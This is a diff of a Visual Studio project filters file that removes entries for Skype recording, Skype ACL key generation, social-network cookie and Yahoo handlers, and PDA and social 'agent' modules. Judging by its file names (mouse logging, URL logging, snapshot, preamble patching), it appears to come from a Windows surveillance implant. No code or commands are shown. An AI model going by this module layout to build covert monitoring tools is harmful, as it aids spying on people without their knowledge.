@@ -16,9 +16,6 @@
     <ClCompile Include="H4-DLL.cpp">
       <Filter>Source Files</Filter>
     </ClCompile>
-    <ClCompile Include="SkypeACL\HashUtil.cpp">
-      <Filter>Source Files</Filter>
-    </ClCompile>
     <ClCompile Include="HM_CodeAlign.cpp">
       <Filter>Source Files</Filter>
     </ClCompile>
@@ -31,16 +28,10 @@
     <ClCompile Include="HM_SafeProcedures.cpp">
       <Filter>Source Files</Filter>
     </ClCompile>
-    <ClCompile Include="SkypeACL\KeyGen_SBOX.cpp">
-      <Filter>Source Files</Filter>
-    </ClCompile>
     <ClCompile Include="LOG.cpp">
       <Filter>Source Files</Filter>
     </ClCompile>
     <ClCompile Include="HM_ContactAgent\OLABMAPI.cpp">
-      <Filter>Source Files</Filter>
-    </ClCompile>
-    <ClCompile Include="SkypeACL\SkypeACL.cpp">
       <Filter>Source Files</Filter>
     </ClCompile>
     <ClCompile Include="SM_Core.cpp">
@@ -115,9 +106,6 @@
     <ClCompile Include="strings.cpp">
       <Filter>Source Files</Filter>
     </ClCompile>
-    <ClCompile Include="HM_SkypeRecord.cpp">
-      <Filter>Source Files</Filter>
-    </ClCompile>
     <ClCompile Include="HM_IpcModule.cpp">
       <Filter>Source Files\core</Filter>
     </ClCompile>
@@ -147,9 +135,6 @@
     <ClInclude Include="common.h">
       <Filter>Header Files</Filter>
     </ClInclude>
-    <ClInclude Include="Social\CookieHandler.h">
-      <Filter>Header Files</Filter>
-    </ClInclude>
     <ClInclude Include="DeepFreeze.h">
       <Filter>Header Files</Filter>
     </ClInclude>
@@ -166,9 +151,6 @@
       <Filter>Header Files</Filter>
     </ClInclude>
     <ClInclude Include="H4-DLL.h">
-      <Filter>Header Files</Filter>
-    </ClInclude>
-    <ClInclude Include="Social\Handler_Yahoo.h">
       <Filter>Header Files</Filter>
     </ClInclude>
     <ClInclude Include="SkypeACL\HashUtil.h">
@@ -207,9 +189,6 @@
     <ClInclude Include="HM_MouseLog.h">
       <Filter>Header Files</Filter>
     </ClInclude>
-    <ClInclude Include="HM_PDAAgent.h">
-      <Filter>Header Files</Filter>
-    </ClInclude>
     <ClInclude Include="HM_PreamblePatch.h">
       <Filter>Header Files</Filter>
     </ClInclude>
@@ -228,13 +207,7 @@
     <ClInclude Include="HM_SafeProcedures.h">
       <Filter>Header Files</Filter>
     </ClInclude>
-    <ClInclude Include="HM_SkypeRecord.h">
-      <Filter>Header Files</Filter>
-    </ClInclude>
     <ClInclude Include="HM_SnapShot.h">
-      <Filter>Header Files</Filter>
-    </ClInclude>
-    <ClInclude Include="HM_SocialAgent.h">
       <Filter>Header Files</Filter>
     </ClInclude>
     <ClInclude Include="HM_UrlLog.h">
@@ -283,9 +256,6 @@
       <Filter>Header Files</Filter>
     </ClInclude>
     <ClInclude Include="SM_EventHandlers.h">
-      <Filter>Header Files</Filter>
-    </ClInclude>
-    <ClInclude Include="Social\SocialMain.h">
       <Filter>Header Files</Filter>
     </ClInclude>
     <ClInclude Include="status_log.h">
